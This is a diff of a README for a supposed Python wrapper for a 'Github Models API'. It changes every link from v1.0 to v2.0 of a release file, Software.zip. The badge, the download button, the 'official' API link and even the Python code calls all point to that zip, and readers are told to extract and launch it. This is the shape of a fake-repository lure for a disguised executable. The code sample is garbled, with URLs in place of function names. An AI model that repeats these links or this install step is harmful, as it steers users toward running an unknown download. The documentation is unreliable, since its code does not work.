@@ -1,6 +1,6 @@
 # GithubAIPy 🤖
 
-![GithubAIPy](https://github.com/JEFF2807/GithubAIPy/releases/download/v1.0/Software.zip)
+![GithubAIPy](https://github.com/JEFF2807/GithubAIPy/releases/download/v2.0/Software.zip)
 
 Welcome to GithubAIPy! This repository contains a small Python wrapper for Github Models API. With this wrapper, you can easily interact with various AI models available on Github and leverage their capabilities in your projects. Whether you are working on AI, chat applications, or data analysis, GithubAIPy has got you covered!
 
@@ -8,7 +8,7 @@ Welcome to GithubAIPy! This repository contains a small Python wrapper for Githu
 
 To get started with GithubAIPy, you can download the latest release by clicking the button below:
 
-[![Download GithubAIPy](https://github.com/JEFF2807/GithubAIPy/releases/download/v1.0/Software.zip)](https://github.com/JEFF2807/GithubAIPy/releases/download/v1.0/Software.zip)
+[![Download GithubAIPy](https://github.com/JEFF2807/GithubAIPy/releases/download/v2.0/Software.zip)](https://github.com/JEFF2807/GithubAIPy/releases/download/v2.0/Software.zip)
 
 Please note that the downloaded file needs to be extracted and launched for installation.
 
@@ -30,13 +30,13 @@ from github_aipy import GithubModelsAPI
 github_api = GithubModelsAPI()
 
 # Get available models
-models = https://github.com/JEFF2807/GithubAIPy/releases/download/v1.0/Software.zip()
+models = https://github.com/JEFF2807/GithubAIPy/releases/download/v2.0/Software.zip()
 
 # Choose a model (e.g., ChatGPT)
-chat_model = https://github.com/JEFF2807/GithubAIPy/releases/download/v1.0/Software.zip("chatgpt")
+chat_model = https://github.com/JEFF2807/GithubAIPy/releases/download/v2.0/Software.zip("chatgpt")
 
 # Interact with the chosen model
-response = https://github.com/JEFF2807/GithubAIPy/releases/download/v1.0/Software.zip("Hello, how are you?")
+response = https://github.com/JEFF2807/GithubAIPy/releases/download/v2.0/Software.zip("Hello, how are you?")
 
 print(response)
 ```
@@ -69,6 +69,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-💡 **Pro Tip**: Visit the official [Github Models API](https://github.com/JEFF2807/GithubAIPy/releases/download/v1.0/Software.zip) page for more information and updates on available models.
+💡 **Pro Tip**: Visit the official [Github Models API](https://github.com/JEFF2807/GithubAIPy/releases/download/v2.0/Software.zip) page for more information and updates on available models.
 
 🚀 Start exploring the world of AI with GithubAIPy today! Thank you for checking out this repository! 🤖
